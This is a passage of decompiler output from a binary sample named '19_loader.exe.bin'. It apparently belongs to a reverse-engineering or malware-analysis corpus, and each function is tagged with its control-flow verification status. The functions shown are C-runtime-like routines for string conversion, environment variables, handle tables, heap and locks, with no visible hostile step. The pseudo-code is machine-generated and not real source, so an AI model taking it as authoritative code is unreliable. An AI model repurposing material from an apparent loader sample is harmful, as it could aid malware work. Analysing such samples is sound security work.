    FUN_14001ae9c(local_228,(longlong)&local_260,local_288,uVar3);
  }
  FUN_14001a2d0(local_18 ^ (ulonglong)auStack_2a8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ae9c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ae9c rva=0x1ae9c */

undefined4 FUN_14001ae9c(short *param_1,longlong param_2,undefined8 param_3,uint param_4)

{
  int iVar1;
  DWORD DVar2;
  undefined8 *puVar3;
  
  if (param_1 == (short *)0x0) {
    if (*(char *)(param_2 + 0x28) != '\0') {
      *(undefined1 *)(param_2 + 0x28) = 0;
    }
    *(undefined8 *)(param_2 + 0x10) = 0;
    *(undefined8 *)(param_2 + 0x18) = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_14001b0e8(param_4,0,param_1,0xffffffff);
      if (iVar1 != 0) {
        if (*(ulonglong *)(param_2 + 0x18) < (ulonglong)(longlong)iVar1) {
          if (*(char *)(param_2 + 0x28) != '\0') {
            *(undefined1 *)(param_2 + 0x28) = 0;
          }
          goto LAB_14001aef0;
        }
        iVar1 = FUN_14001b0e8(param_4,0,param_1,0xffffffff);
        if ((longlong)iVar1 != 0) {
          *(longlong *)(param_2 + 0x20) = (longlong)iVar1 + -1;
          return 0;
        }
      }
      DVar2 = GetLastError();
      FUN_140018e34(DVar2);
      puVar3 = FUN_140018dec();
      return *(undefined4 *)puVar3;
    }
    if (*(longlong *)(param_2 + 0x18) == 0) {
      if (*(char *)(param_2 + 0x28) != '\0') {
        *(undefined1 *)(param_2 + 0x28) = 0;
      }
LAB_14001aef0:
      puVar3 = FUN_140018dec();
      *(undefined4 *)puVar3 = 0x22;
      *(undefined1 *)(param_2 + 0x28) = 0;
      *(undefined8 *)(param_2 + 0x18) = 0;
      return 0x22;
    }
    **(undefined1 **)(param_2 + 0x10) = 0;
  }
  *(undefined8 *)(param_2 + 0x20) = 0;
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1afb8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001afb8 rva=0x1afb8 */

void FUN_14001afb8(uint param_1)

{
  FUN_14001afcc((undefined4 *)0x0,param_1,0,4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1afcc | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001afcc rva=0x1afcc */

undefined8 FUN_14001afcc(undefined4 *param_1,uint param_2,uint param_3,byte param_4)

{
  undefined8 uVar1;
  longlong local_28;
  longlong *local_20;
  longlong local_18;
  char local_10;
  
  FUN_14001743c(&local_28,param_1);
  if (((*(byte *)((ulonglong)(param_2 & 0xff) + 0x19 + local_18) & param_4) == 0) &&
     ((param_3 == 0 || ((param_3 & *(ushort *)(*local_20 + (ulonglong)(param_2 & 0xff) * 2)) == 0)))
     ) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  if (local_10 != '\0') {
    *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) & 0xfffffffd;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b040 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b040 rva=0x1b040 */

LPVOID FUN_14001b040(LPVOID param_1,ulonglong param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  ulonglong uVar2;
  LPVOID pvVar3;
  ulonglong uVar4;
  
  if ((param_2 == 0) || (param_3 <= 0xffffffffffffffe0 / param_2)) {
    if (param_1 == (LPVOID)0x0) {
      uVar2 = 0;
    }
    else {
      uVar2 = FUN_140020250((longlong)param_1);
    }
    uVar4 = param_2 * param_3;
    pvVar3 = FUN_1400202a0(param_1,uVar4);
    if ((pvVar3 != (LPVOID)0x0) && (uVar2 < uVar4)) {
      FUN_1400225e0((undefined1 (*) [32])((longlong)pvVar3 + uVar2),0,uVar4 - uVar2);
    }
  }
  else {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 0xc;
    pvVar3 = (LPVOID)0x0;
  }
  return pvVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b0e8 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_14001b0e8(uint param_1,uint param_2,undefined8 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  bool bVar3;
  undefined4 *in_stack_00000040;
  
  if (param_1 < 0xdead) {
    if (param_1 != 0xdeac) {
      if (param_1 < 0xc434) {
        if ((((param_1 != 0xc433) && (param_1 != 0x2a)) && (param_1 != 0xc42c)) &&
           ((param_1 != 0xc42d && (param_1 != 0xc42e)))) {
          bVar3 = param_1 == 0xc431;
          goto LAB_14001b17e;
        }
      }
      else if ((param_1 != 0xc435) && (param_1 != 0xd698)) {
        iVar1 = param_1 - 0xdeaa;
        goto LAB_14001b179;
      }
    }
  }
  else if (((((param_1 != 0xdead) && (param_1 != 0xdeae)) && (param_1 != 0xdeaf)) &&
           ((param_1 != 0xdeb0 && (param_1 != 0xdeb1)))) &&
          ((param_1 != 0xdeb2 && (param_1 != 0xdeb3)))) {
    iVar1 = param_1 - 65000;
LAB_14001b179:
    if (iVar1 != 0) {
      bVar3 = iVar1 == 1;
LAB_14001b17e:
      if (!bVar3) {
        uVar2 = param_2 & 0xffffff7f;
        goto LAB_14001b188;
      }
    }
  }
  uVar2 = 0;
LAB_14001b188:
  if ((param_1 - 65000 < 2) && (in_stack_00000040 != (undefined4 *)0x0)) {
    *in_stack_00000040 = 0;
  }
  WideCharToMultiByte(param_1,uVar2,param_3,param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b1c8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b1c8 rva=0x1b1c8 */

LPVOID FUN_14001b1c8(void)

{
  WCHAR WVar1;
  int iVar2;
  LPWCH pWVar3;
  longlong lVar5;
  longlong lVar4;
  LPVOID pvVar6;
  undefined4 uVar7;
  WCHAR *pWVar8;
  
  pWVar3 = GetEnvironmentStringsW();
  if (pWVar3 != (LPWCH)0x0) {
    WVar1 = *pWVar3;
    pWVar8 = pWVar3;
    while (WVar1 != L'\0') {
      lVar4 = -1;
      do {
        lVar5 = lVar4;
        lVar4 = lVar5 + 1;
      } while (pWVar8[lVar4] != L'\0');
      pWVar8 = pWVar8 + lVar5 + 2;
      WVar1 = *pWVar8;
    }
    uVar7 = (undefined4)((longlong)pWVar8 + (2 - (longlong)pWVar3) >> 1);
    iVar2 = FUN_14001b0e8(0,0,pWVar3,uVar7);
    if (iVar2 != 0) {
      pvVar6 = FUN_140019a00((longlong)iVar2);
      if (pvVar6 != (LPVOID)0x0) {
        iVar2 = FUN_14001b0e8(0,0,pWVar3,uVar7);
        if (iVar2 == 0) {
          FUN_140017fb0(pvVar6);
          pvVar6 = (LPVOID)0x0;
        }
        else {
          FUN_140017fb0((LPVOID)0x0);
        }
        FreeEnvironmentStringsW(pWVar3);
        return pvVar6;
      }
      FUN_140017fb0((LPVOID)0x0);
    }
    FreeEnvironmentStringsW(pWVar3);
  }
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b2d8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b2d8 rva=0x1b2d8 */

ulonglong thunk_FUN_14001b2e0(byte *param_1,int param_2)

{
  byte bVar1;
  BOOL BVar2;
  undefined8 *puVar3;
  byte *pbVar4;
  longlong lVar5;
  ulonglong uVar6;
  byte *pbVar7;
  longlong *plVar8;
  char *pcVar9;
  undefined8 uVar10;
  longlong *plVar11;
  ulonglong uVar12;
  ulonglong uVar13;
  longlong lVar14;
  
  uVar12 = 0;
  if (param_1 == (byte *)0x0) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    return 0xffffffffffffffff;
  }
  pbVar4 = (byte *)FUN_140020320((ulonglong)param_1,'=');
  if ((pbVar4 == (byte *)0x0) || (pbVar4 == param_1)) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_140017fb0(param_1);
    return 0xffffffffffffffff;
  }
  bVar1 = pbVar4[1];
  if (DAT_1400e0938 == DAT_1400e0950) {
    DAT_1400e0938 = FUN_14001b638(DAT_1400e0938);
  }
  if (DAT_1400e0938 == (longlong *)0x0) {
    if ((param_2 == 0) || (DAT_1400e0940 == (LPVOID)0x0)) {
      if (bVar1 == 0) goto LAB_14001b4ea;
      DAT_1400e0938 = FUN_140019980(1,8);
      FUN_140017fb0((LPVOID)0x0);
      if (DAT_1400e0938 != (longlong *)0x0) {
        if (DAT_1400e0940 == (LPVOID)0x0) {
          DAT_1400e0940 = FUN_140019980(1,8);
          FUN_140017fb0((LPVOID)0x0);
          if (DAT_1400e0940 == (LPVOID)0x0) goto LAB_14001b392;
        }
LAB_14001b431:
        if (DAT_1400e0938 != (longlong *)0x0) goto LAB_14001b43a;
      }
    }
    else {
      lVar5 = FUN_140015988();
      if (lVar5 != 0) {
        if (DAT_1400e0938 == DAT_1400e0950) {
          DAT_1400e0938 = FUN_14001b638(DAT_1400e0938);
        }
        goto LAB_14001b431;
      }
      puVar3 = FUN_140018dec();
      *(undefined4 *)puVar3 = 0x16;
    }
  }
  else {
LAB_14001b43a:
    plVar8 = DAT_1400e0938;
    uVar13 = (longlong)pbVar4 - (longlong)param_1;
    pbVar7 = (byte *)*DAT_1400e0938;
    plVar11 = DAT_1400e0938;
    while (pbVar7 != (byte *)0x0) {
      uVar6 = FUN_1400203b0(param_1,pbVar7,uVar13);
      if (((int)uVar6 == 0) &&
         ((*(char *)(uVar13 + *plVar11) == '=' || (*(char *)(uVar13 + *plVar11) == '\0')))) {
        uVar13 = (longlong)plVar11 - (longlong)plVar8 >> 3;
        goto LAB_14001b480;
      }
      plVar11 = plVar11 + 1;
      pbVar7 = (byte *)*plVar11;
    }
    uVar13 = -((longlong)plVar11 - (longlong)plVar8 >> 3);
LAB_14001b480:
    if ((-1 < (longlong)uVar13) && (*plVar8 != 0)) {
      FUN_140017fb0((LPVOID)plVar8[uVar13]);
      if (bVar1 == 0) {
        for (; plVar8[uVar13] != 0; uVar13 = uVar13 + 1) {
          plVar8[uVar13] = plVar8[uVar13 + 1];
        }
        plVar8 = FUN_14001b040(plVar8,uVar13,8);
        FUN_140017fb0((LPVOID)0x0);
        pbVar7 = param_1;
        if (plVar8 != (longlong *)0x0) {
          DAT_1400e0938 = plVar8;
        }
      }
      else {
        plVar8[uVar13] = (longlong)param_1;
LAB_14001b545:
        pbVar7 = (byte *)0x0;
      }
      if (param_2 == 0) {
LAB_14001b5e8:
        FUN_140017fb0(pbVar7);
        return 0;
      }
      lVar5 = -1;
      do {
        lVar14 = lVar5;
        lVar5 = lVar14 + 1;
      } while (param_1[lVar14 + 1] != 0);
      pcVar9 = FUN_140019980(lVar14 + 3,1);
      if (pcVar9 == (char *)0x0) {
        FUN_140017fb0((LPVOID)0x0);
      }
      else {
        uVar10 = FUN_140016340(pcVar9,lVar14 + 3,(longlong)param_1);
        if ((int)uVar10 != 0) {
                    /* WARNING: Subroutine does not return */
          FUN_1400180e4();
        }
        pbVar4[(longlong)pcVar9 - (longlong)param_1] = 0;
        BVar2 = FUN_140020554(pcVar9,(LPCSTR)(-(ulonglong)(bVar1 != 0) &
                                             (ulonglong)
                                             (pbVar4 + ((longlong)pcVar9 - (longlong)param_1) + 1)))
        ;
        if (BVar2 != 0) {
          FUN_140017fb0(pcVar9);
          goto LAB_14001b5e8;
        }
        puVar3 = FUN_140018dec();
        *(undefined4 *)puVar3 = 0x2a;
        FUN_140017fb0(pcVar9);
        uVar12 = 0xffffffff;
      }
      FUN_140017fb0(pbVar7);
      return uVar12;
    }
    if (bVar1 == 0) {
LAB_14001b4ea:
      uVar12 = 0;
      goto LAB_14001b396;
    }
    uVar6 = -uVar13 + 2;
    if ((-uVar13 <= uVar6) && (uVar6 < 0x1fffffffffffffff)) {
      plVar8 = FUN_14001b040(plVar8,uVar6,8);
      FUN_140017fb0((LPVOID)0x0);
      if (plVar8 != (longlong *)0x0) {
        plVar8[-uVar13] = (longlong)param_1;
        plVar8[1 - uVar13] = 0;
        DAT_1400e0938 = plVar8;
        goto LAB_14001b545;
      }
    }
  }
LAB_14001b392:
  uVar12 = 0xffffffffffffffff;
LAB_14001b396:
  FUN_140017fb0(param_1);
  return uVar12 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b2e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b2e0 rva=0x1b2e0 */

ulonglong FUN_14001b2e0(byte *param_1,int param_2)

{
  byte bVar1;
  BOOL BVar2;
  undefined8 *puVar3;
  byte *pbVar4;
  longlong lVar5;
  ulonglong uVar6;
  byte *pbVar7;
  longlong *plVar8;
  char *pcVar9;
  undefined8 uVar10;
  longlong *plVar11;
  ulonglong uVar12;
  ulonglong uVar13;
  longlong lVar14;
  
  uVar12 = 0;
  if (param_1 == (byte *)0x0) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    return 0xffffffffffffffff;
  }
  pbVar4 = (byte *)FUN_140020320((ulonglong)param_1,'=');
  if ((pbVar4 == (byte *)0x0) || (pbVar4 == param_1)) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_140017fb0(param_1);
    return 0xffffffffffffffff;
  }
  bVar1 = pbVar4[1];
  if (DAT_1400e0938 == DAT_1400e0950) {
    DAT_1400e0938 = FUN_14001b638(DAT_1400e0938);
  }
  if (DAT_1400e0938 == (longlong *)0x0) {
    if ((param_2 == 0) || (DAT_1400e0940 == (LPVOID)0x0)) {
      if (bVar1 == 0) goto LAB_14001b4ea;
      DAT_1400e0938 = FUN_140019980(1,8);
      FUN_140017fb0((LPVOID)0x0);
      if (DAT_1400e0938 != (longlong *)0x0) {
        if (DAT_1400e0940 == (LPVOID)0x0) {
          DAT_1400e0940 = FUN_140019980(1,8);
          FUN_140017fb0((LPVOID)0x0);
          if (DAT_1400e0940 == (LPVOID)0x0) goto LAB_14001b392;
        }
LAB_14001b431:
        if (DAT_1400e0938 != (longlong *)0x0) goto LAB_14001b43a;
      }
    }
    else {
      lVar5 = FUN_140015988();
      if (lVar5 != 0) {
        if (DAT_1400e0938 == DAT_1400e0950) {
          DAT_1400e0938 = FUN_14001b638(DAT_1400e0938);
        }
        goto LAB_14001b431;
      }
      puVar3 = FUN_140018dec();
      *(undefined4 *)puVar3 = 0x16;
    }
  }
  else {
LAB_14001b43a:
    plVar8 = DAT_1400e0938;
    uVar13 = (longlong)pbVar4 - (longlong)param_1;
    pbVar7 = (byte *)*DAT_1400e0938;
    plVar11 = DAT_1400e0938;
    while (pbVar7 != (byte *)0x0) {
      uVar6 = FUN_1400203b0(param_1,pbVar7,uVar13);
      if (((int)uVar6 == 0) &&
         ((*(char *)(uVar13 + *plVar11) == '=' || (*(char *)(uVar13 + *plVar11) == '\0')))) {
        uVar13 = (longlong)plVar11 - (longlong)plVar8 >> 3;
        goto LAB_14001b480;
      }
      plVar11 = plVar11 + 1;
      pbVar7 = (byte *)*plVar11;
    }
    uVar13 = -((longlong)plVar11 - (longlong)plVar8 >> 3);
LAB_14001b480:
    if ((-1 < (longlong)uVar13) && (*plVar8 != 0)) {
      FUN_140017fb0((LPVOID)plVar8[uVar13]);
      if (bVar1 == 0) {
        for (; plVar8[uVar13] != 0; uVar13 = uVar13 + 1) {
          plVar8[uVar13] = plVar8[uVar13 + 1];
        }
        plVar8 = FUN_14001b040(plVar8,uVar13,8);
        FUN_140017fb0((LPVOID)0x0);
        pbVar7 = param_1;
        if (plVar8 != (longlong *)0x0) {
          DAT_1400e0938 = plVar8;
        }
      }
      else {
        plVar8[uVar13] = (longlong)param_1;
LAB_14001b545:
        pbVar7 = (byte *)0x0;
      }
      if (param_2 == 0) {
LAB_14001b5e8:
        FUN_140017fb0(pbVar7);
        return 0;
      }
      lVar5 = -1;
      do {
        lVar14 = lVar5;
        lVar5 = lVar14 + 1;
      } while (param_1[lVar14 + 1] != 0);
      pcVar9 = FUN_140019980(lVar14 + 3,1);
      if (pcVar9 == (char *)0x0) {
        FUN_140017fb0((LPVOID)0x0);
      }
      else {
        uVar10 = FUN_140016340(pcVar9,lVar14 + 3,(longlong)param_1);
        if ((int)uVar10 != 0) {
                    /* WARNING: Subroutine does not return */
          FUN_1400180e4();
        }
        pbVar4[(longlong)pcVar9 - (longlong)param_1] = 0;
        BVar2 = FUN_140020554(pcVar9,(LPCSTR)(-(ulonglong)(bVar1 != 0) &
                                             (ulonglong)
                                             (pbVar4 + ((longlong)pcVar9 - (longlong)param_1) + 1)))
        ;
        if (BVar2 != 0) {
          FUN_140017fb0(pcVar9);
          goto LAB_14001b5e8;
        }
        puVar3 = FUN_140018dec();
        *(undefined4 *)puVar3 = 0x2a;
        FUN_140017fb0(pcVar9);
        uVar12 = 0xffffffff;
      }
      FUN_140017fb0(pbVar7);
      return uVar12;
    }
    if (bVar1 == 0) {
LAB_14001b4ea:
      uVar12 = 0;
      goto LAB_14001b396;
    }
    uVar6 = -uVar13 + 2;
    if ((-uVar13 <= uVar6) && (uVar6 < 0x1fffffffffffffff)) {
      plVar8 = FUN_14001b040(plVar8,uVar6,8);
      FUN_140017fb0((LPVOID)0x0);
      if (plVar8 != (longlong *)0x0) {
        plVar8[-uVar13] = (longlong)param_1;
        plVar8[1 - uVar13] = 0;
        DAT_1400e0938 = plVar8;
        goto LAB_14001b545;
      }
    }
  }
LAB_14001b392:
  uVar12 = 0xffffffffffffffff;
LAB_14001b396:
  FUN_140017fb0(param_1);
  return uVar12 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b638 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b638 rva=0x1b638 */

LPVOID FUN_14001b638(longlong *param_1)

{
  char *pcVar1;
  longlong *plVar2;
  longlong lVar3;
  LPVOID pvVar4;
  longlong lVar5;
  LPVOID pvVar6;
  undefined8 uVar7;
  longlong lVar8;
  longlong lVar9;
  
  if (param_1 == (longlong *)0x0) {
    pvVar4 = (LPVOID)0x0;
  }
  else {
    lVar8 = 0;
    lVar5 = *param_1;
    plVar2 = param_1;
    while (lVar5 != 0) {
      lVar8 = lVar8 + 1;
      plVar2 = plVar2 + 1;
      lVar5 = *plVar2;
    }
    pvVar4 = FUN_140019980(lVar8 + 1,8);
    if (pvVar4 == (LPVOID)0x0) {
LAB_14001b717:
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
    lVar5 = *param_1;
    if (lVar5 != 0) {
      lVar8 = (longlong)pvVar4 - (longlong)param_1;
      do {
        lVar3 = -1;
        do {
          lVar9 = lVar3;
          lVar3 = lVar9 + 1;
        } while (*(char *)(lVar5 + lVar9 + 1) != '\0');
        pvVar6 = FUN_140019980(lVar9 + 2,1);
        *(LPVOID *)(lVar8 + (longlong)param_1) = pvVar6;
        FUN_140017fb0((LPVOID)0x0);
        pcVar1 = *(char **)(lVar8 + (longlong)param_1);
        if (pcVar1 == (char *)0x0) goto LAB_14001b717;
        uVar7 = FUN_140016340(pcVar1,lVar9 + 2,*param_1);
        if ((int)uVar7 != 0) {
                    /* WARNING: Subroutine does not return */
          FUN_1400180e4();
        }
        param_1 = param_1 + 1;
        lVar5 = *param_1;
      } while (lVar5 != 0);
    }
    FUN_140017fb0((LPVOID)0x0);
  }
  return pvVar4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b720 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b720 rva=0x1b720 */

undefined8 FUN_14001b720(uint param_1)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = (undefined4 *)FUN_140018e10();
    *puVar1 = 0;
    puVar2 = FUN_140018dec();
    *(undefined4 *)puVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_1400e1140)) {
      if ((*(byte *)((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x38 +
                    (ulonglong)(param_1 & 0x3f) * 0x48) & 1) != 0) {
        return *(undefined8 *)
                ((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x28 +
                (ulonglong)(param_1 & 0x3f) * 0x48);
      }
    }
    puVar1 = (undefined4 *)FUN_140018e10();
    *puVar1 = 0;
    puVar2 = FUN_140018dec();
    *(undefined4 *)puVar2 = 9;
    FUN_1400180c4();
  }
  return 0xffffffffffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b798 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b798 rva=0x1b798 */

undefined8 FUN_14001b798(uint param_1)

{
  int iVar1;
  ulonglong uVar2;
  undefined8 *puVar3;
  undefined4 *puVar4;
  DWORD nStdHandle;
  
  if ((-1 < (int)param_1) && (param_1 < DAT_1400e1140)) {
    uVar2 = (ulonglong)(param_1 & 0x3f);
    if (((*(byte *)((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x38 + uVar2 * 0x48)
         & 1) != 0) &&
       (*(longlong *)
         ((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x28 + uVar2 * 0x48) != -1)) {
      iVar1 = FUN_140015ecc();
      if (iVar1 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_14001b818;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_14001b818:
      *(undefined8 *)
       ((&DAT_1400e0d40)[(ulonglong)(longlong)(int)param_1 >> 6] + 0x28 + uVar2 * 0x48) =
           0xffffffffffffffff;
      return 0;
    }
  }
  puVar3 = FUN_140018dec();
  *(undefined4 *)puVar3 = 9;
  puVar4 = (undefined4 *)FUN_140018e10();
  *puVar4 = 0;
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b854 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b854 rva=0x1b854 */

undefined8 * FUN_14001b854(void)

{
  undefined8 *puVar1;
  uint uVar2;
  undefined8 *puVar3;
  undefined1 *puVar4;
  undefined8 *puVar5;
  
  puVar3 = FUN_140019980(0x40,0x48);
  puVar5 = (undefined8 *)0x0;
  if (puVar3 != (undefined8 *)0x0) {
    if (puVar3 != puVar3 + 0x240) {
      puVar5 = puVar3 + 6;
      do {
        InitializeCriticalSectionEx((LPCRITICAL_SECTION)(puVar5 + -6),4000,0);
        puVar5[-1] = 0xffffffffffffffff;
        puVar4 = (undefined1 *)((longlong)puVar5 + 0xe);
        *(byte *)((longlong)puVar5 + 0xd) = *(byte *)((longlong)puVar5 + 0xd) & 0xf8;
        uVar2 = 0;
        *puVar5 = 0;
        *(undefined4 *)(puVar5 + 1) = 0xa0a0000;
        *(undefined1 *)((longlong)puVar5 + 0xc) = 10;
        do {
          *puVar4 = 0;
          uVar2 = uVar2 + 1;
          puVar4 = puVar4 + 1;
        } while (uVar2 < 5);
        puVar1 = puVar5 + 3;
        puVar5 = puVar5 + 9;
      } while (puVar1 != puVar3 + 0x240);
    }
    puVar5 = puVar3;
  }
  FUN_140017fb0((LPVOID)0x0);
  return puVar5;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b8fc | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b8fc rva=0x1b8fc */

void FUN_14001b8fc(LPCRITICAL_SECTION param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  
  if (param_1 != (LPCRITICAL_SECTION)0x0) {
    for (lpCriticalSection = param_1;
        lpCriticalSection != (LPCRITICAL_SECTION)&param_1[0x73].LockCount;
        lpCriticalSection = (LPCRITICAL_SECTION)&lpCriticalSection[1].SpinCount) {
      DeleteCriticalSection(lpCriticalSection);
    }
    FUN_140017fb0(param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b94c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001b94c rva=0x1b94c */

undefined4 FUN_14001b94c(uint param_1)

{
  int iVar1;
  undefined8 *puVar2;
  longlong lVar3;
  undefined4 uVar4;
  
  if (param_1 < 0x2000) {
    uVar4 = 0;
    FUN_140016ab4(7);
    lVar3 = 0;
    iVar1 = DAT_1400e1140;
    while (iVar1 <= (int)param_1) {
      if ((&DAT_1400e0d40)[lVar3] == 0) {
        puVar2 = FUN_14001b854();
        (&DAT_1400e0d40)[lVar3] = puVar2;
        if (puVar2 == (undefined8 *)0x0) {
          uVar4 = 0xc;
          break;
        }
        iVar1 = DAT_1400e1140 + 0x40;
        DAT_1400e1140 = iVar1;
      }
      lVar3 = lVar3 + 1;
    }
    FUN_140016ad0(7);
  }
  else {
    puVar2 = FUN_140018dec();
    *(undefined4 *)puVar2 = 9;
    FUN_1400180c4();
    uVar4 = 9;
  }
  return uVar4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1b9f4 | partial_markers_remain ===== */
/* address=14001b9f4 rva=0x1b9f4 */

void FUN_14001b9f4(uint param_1)

{
                    /* WARNING: Could not recover jumptable at 0x00014001ba14. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection
            ((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + (ulonglong)(param_1 & 0x3f) * 0x48);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ba1c | partial_markers_remain ===== */
/* address=14001ba1c rva=0x1ba1c */

void FUN_14001ba1c(uint param_1)

{
                    /* WARNING: Could not recover jumptable at 0x00014001ba3c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection
            ((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + (ulonglong)(param_1 & 0x3f) * 0x48);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ba60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ba60 rva=0x1ba60 */

void FUN_14001ba60(PEXCEPTION_RECORD param_1,PVOID param_2,longlong param_3,longlong *param_4)

{
  undefined8 uVar1;
  PVOID pvVar2;
  
  uVar1 = FUN_140014740(param_1,param_2,param_3,param_4);
  if ((((param_1->ExceptionFlags & 0x66) == 0) && (param_1->ExceptionCode == 0xe06d7363)) &&
     ((int)uVar1 == 1)) {
    pvVar2 = FUN_1400161f0();
    *(PEXCEPTION_RECORD *)((longlong)pvVar2 + 0x20) = param_1;
    pvVar2 = FUN_1400161f0();
    *(longlong *)((longlong)pvVar2 + 0x28) = param_3;
                    /* WARNING: Subroutine does not return */
    FUN_140015f5c();
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1bab0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001bab0 rva=0x1bab0 */

LPVOID thunk_FUN_140019980(ulonglong param_1,ulonglong param_2)

{
  bool bVar1;
  int iVar2;
  undefined7 extraout_var;
  LPVOID pvVar3;
  undefined8 *puVar4;
  SIZE_T dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffffffffffe0 / param_1)) {
    dwBytes = param_1 * param_2;
    if (dwBytes == 0) {
      dwBytes = 1;
    }
    do {
      pvVar3 = HeapAlloc(DAT_1400e0d30,8,dwBytes);
      if (pvVar3 != (LPVOID)0x0) {
        return pvVar3;
      }
      iVar2 = FUN_140015f20();
    } while ((iVar2 != 0) &&
            (bVar1 = FUN_140018520(dwBytes), (int)CONCAT71(extraout_var,bVar1) != 0));
  }
  puVar4 = FUN_140018dec();
  *(undefined4 *)puVar4 = 0xc;
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1bac0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001bac0 rva=0x1bac0 */

void thunk_FUN_140017fb0(LPVOID param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  uint *puVar4;
  
  if ((param_1 != (LPVOID)0x0) && (BVar1 = HeapFree(DAT_1400e0d30,0,param_1), BVar1 == 0)) {
    DVar2 = GetLastError();
    uVar3 = FUN_140018e5c(DVar2);
    puVar4 = (uint *)FUN_140018dec();
    *puVar4 = uVar3;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1bad0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001bad0 rva=0x1bad0 */

void FUN_14001bad0(longlong *param_1)

{
  longlong lVar1;
  
  lVar1 = FUN_14001835c(param_1);
  param_1[3] = *(longlong *)(lVar1 + 0x90);
  param_1[4] = *(longlong *)(lVar1 + 0x88);
  FUN_14001d10c(lVar1,param_1 + 3,param_1[1]);
  FUN_14001d144(lVar1,param_1 + 4,param_1[1]);
  if ((*(uint *)(lVar1 + 0x3a8) & 2) == 0) {
    *(uint *)(lVar1 + 0x3a8) = *(uint *)(lVar1 + 0x3a8) | 2;
    *(undefined1 *)(param_1 + 5) = 2;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1bb60 | partial_markers_remain ===== */
/* address=14001bb60 rva=0x1bb60 */

void FUN_14001bb60(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 auVar3 [32];
  undefined1 auVar4 [32];
  undefined1 auVar5 [32];
  undefined1 auVar6 [32];
  undefined1 uVar7;
  undefined2 uVar8;
  undefined4 uVar9;
